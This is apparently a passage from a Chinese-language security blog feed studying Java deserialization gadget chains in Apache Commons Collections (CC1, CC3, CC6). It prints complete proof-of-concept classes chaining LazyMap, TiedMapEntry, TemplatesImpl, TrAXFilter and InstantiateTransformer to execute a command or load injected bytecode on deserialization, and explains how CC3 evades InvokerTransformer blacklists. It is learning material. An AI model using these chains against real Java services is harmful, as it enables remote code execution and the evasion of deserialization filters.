class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(lazyMap,chainedTransformer);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; outerMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;value&quot;</span>);<br>        <br>        map.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryFiled.set(outerMap, chainedTransformer);<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011706864.png"></p><h3 id="CC3-ï¼ˆInstantiateTransformerï¼‰"><a href="#CC3-ï¼ˆInstantiateTransformerï¼‰" class="headerlink" title="CC3 ï¼ˆInstantiateTransformerï¼‰"></a>CC3 ï¼ˆ<font style="color:rgb(26, 32, 44);">InstantiateTransformer</font>ï¼‰</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707898.png"></p><h4 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h4><p>è€Œåœ¨ ysoserial ä¸­å¹¶æ²¡æœ‰ä½¿ç”¨ <strong><font style="color:rgb(44, 62, 80);">InvokerTransformer</font></strong><font style="color:rgb(44, 62, 80);">ï¼Œè¿™æ˜¯å› ä¸ºé»‘åå•è¿‡æ»¤æ—¶å¾ˆæœ‰å¯èƒ½ä¼šå°† </font><strong><font style="color:rgb(44, 62, 80);">InvokerTransformer </font></strong><font style="color:rgb(44, 62, 80);">ç›´æ¥ç¦ç”¨ï¼Œä¸ºäº†æ›´å¹¿æ³›çš„ä½¿ç”¨ï¼Œ ysoserial æ¢äº†ä¸€æ¡è·¯ï¼š</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707295.png"></p><blockquote><p>ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹ä¸­ä¹Ÿæœ‰æåŠ</p><p>2015å¹´åˆï¼Œ@frohoffå’Œ@geblå‘å¸ƒäº†Talk<a href="https://frohoff.github.io/appseccali-marshalling-pickles/">ã€ŠMarshalling Pickles: how deserializing objects will ruin your dayã€‹</a>ï¼Œä»¥åŠJavaååºåˆ—åŒ–åˆ©ç”¨å·¥å…·ysoserialï¼Œéšåå¼•çˆ†äº†å®‰å…¨ç•Œã€‚å¼€å‘è€…ä»¬è‡ªç„¶ä¼šå»æ‰¾å¯»ä¸€ç§å®‰å…¨çš„è¿‡æ»¤æ–¹æ³•ï¼Œäºæ˜¯ç±»ä¼¼ <a href="https://github.com/ikkisoft/SerialKiller">Serialkiller</a> è¿™æ ·çš„å·¥å…·éšä¹‹è¯ç”Ÿã€‚</p><p>SerialKilleræ˜¯ä¸€ä¸ªavaååºåˆ—åŒ–è¿‡æ»¤å™¨ï¼Œå¯ä»¥é€šè¿‡é»‘åå•ä¸ç™½åå•çš„æ–¹å¼æ¥é™åˆ¶ååºåˆ—åŒ–æ—¶å…è®¸é€šè¿‡çš„ç±»ã€‚åœ¨å…¶å‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶ç»™å‡ºäº†æœ€åˆçš„<a href="https://github.com/ikkisoft/SerialKiller/blob/998c0abc5b/config/serialkiller.conf">é»‘åå•</a>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011716289.png"></p><p>è¿™ä¸ªé»‘åå•ä¸­InvokerTransformerèµ«ç„¶åœ¨åˆ—ï¼Œä¹Ÿå°±åˆ‡æ–­äº†CommonsCollections1çš„åˆ©ç”¨é“¾ã€‚æœ‰æ”»å°±æœ‰é˜²ï¼Œysoserialéšåå¢åŠ äº†ä¸å°‘æ–°çš„Gadgetsï¼Œå…¶ä¸­å°±åŒ…æ‹¬CommonsCollections3ã€‚</p><p>CommonsCollections3çš„ç›®çš„å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä¸ºäº†ç»•è¿‡ä¸€äº›è§„åˆ™å¯¹InvokerTransformerçš„é™åˆ¶ã€‚CommonsCollections3å¹¶æ²¡æœ‰ä½¿ç”¨åˆ°InvokerTransformeræ¥è°ƒç”¨ä»»æ„æ–¹æ³•ï¼Œè€Œæ˜¯ç”¨åˆ°äº†å¦ä¸€ä¸ªç±»ï¼Œ<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAxFilter</code>ã€‚</p></blockquote><p>ç°åœ¨ç»§ç»­æ‰¾ <font style="color:#080808;background-color:#ffffff;">newTransformer çš„ç”¨æ³•ï¼š</font></p><p>è¿™é‡Œçš„ <code>Process</code> åªæ˜¯ <code>exec()</code> çš„è¿”å›å€¼ï¼Œå¦‚æœä½ ä¸å»è¯»å®ƒçš„è¾“å‡ºæˆ–ç­‰å¾…å®ƒç»“æŸï¼Œå®ƒå°±æ²¡ç”¨äº†ï¼Œä¸€èˆ¬å¯¹è±¡ï¼Œä¸ç”¨å®ƒ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707624.png"></p><p><code>getOutProperties</code><font style="color:rgb(80, 80, 92);">ï¼Œæ˜¯åå°„è°ƒç”¨çš„æ–¹æ³•ï¼Œå¯èƒ½ä¼šåœ¨ fastjson çš„æ¼æ´é‡Œé¢è¢«è°ƒç”¨ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011707947.png"></p><p><font style="color:rgb(80, 80, 92);">TransformerFactoryImpl ä¸èƒ½åºåˆ—åŒ–ï¼Œå¹¶ä¸”æ„é€ å‡½æ•°ä¼ å‚å›°éš¾</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708644.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708046.png"></p><p><font style="color:#080808;background-color:#ffffff;">TrAXFilter ä¹Ÿä¸èƒ½åºåˆ—åŒ–ï¼Œä½†æ„é€ å‡½æ•°ç®€å•ï¼Œæƒ³ç€è°ƒç”¨ TrAXFilter çš„æ„é€ å‡½æ•°</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708403.png"></p><p>é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨ <font style="color:#080808;background-color:#ffffff;">TrAXFilter çš„æ„é€ å‡½æ•°ï¼Œè¿™é‡Œç”¨åˆ°äº† </font><font style="color:rgb(26, 32, 44);">InstantiateTransformer</font></p><p><font style="color:rgb(26, 32, 44);">InstantiateTransformer.</font><font style="color:#080808;background-color:#ffffff;">transform  åˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸º Class ç±»å‹ï¼Œå¦‚æœæ˜¯ï¼Œè·å–æŒ‡å®šæ„é€ å™¨ï¼Œè°ƒç”¨æ„é€ å‡½æ•°ã€‚</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708848.png"></p><h4 id="æ„é€ POCï¼š"><a href="#æ„é€ POCï¼š" class="headerlink" title="æ„é€ POCï¼š"></a>æ„é€ POCï¼š</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Test03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesFiled.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryFiled.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//æ·»åŠ </span><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//ä¿®æ”¹</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708853.png"></p><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>æœ¬æ¬¡å°±å°† CC1ã€CC3ã€CC6æ”¾åœ¨ä¸€èµ·å§ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011708436.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC6</title>
    <link href="/2025/08/31/CC6/"/>
    <url>/2025/08/31/CC6/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h1><p>JDK 8u71:</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><font style="color:rgb(80, 80, 92);">Comoons-Collections 3.2.1</font></p><h1 id="CC6-é“¾åˆ†æï¼š"><a href="#CC6-é“¾åˆ†æï¼š" class="headerlink" title="CC6 é“¾åˆ†æï¼š"></a>CC6 é“¾åˆ†æï¼š</h1><p>åœ¨ CC1 ä¸­åˆ†æè¿‡ JDK 8u71ä¹‹åçš„ AnnotationInvocationHandler.readObject çš„å†™æ³•æ”¹å˜ï¼Œå¯¼è‡´ CC1 é“¾ç”¨ä¸äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p><p>AnnotationInvocationHandler.readObject</p><p>AnnotationInvocationHandler.invoke.memberValues.get</p><p>è¿™åŠæ¡é“¾å­ç”¨ä¸äº†ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªæ›¿ä»£ï¼Œè¿™ä¸ªæ›¿ä»£ä¹Ÿåº”è¯¥è°ƒç”¨äº† LazyMap.get æ–¹æ³•ï¼Œä¹‹åçš„é“¾å­å’Œ CC1 ä¸€æ ·ã€‚</p><h2 id="1ã€åˆ†æ"><a href="#1ã€åˆ†æ" class="headerlink" title="1ã€åˆ†æ"></a>1ã€åˆ†æ</h2><p>æˆ‘ä»¬æ‰¾åˆ° TiedMapEntry.getValue ä¸­è°ƒç”¨äº† get æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311815897.png"></p><p>è€Œ TiedMapEntry.hashCode è°ƒç”¨äº† getValue ï¼Œ</p><p><img 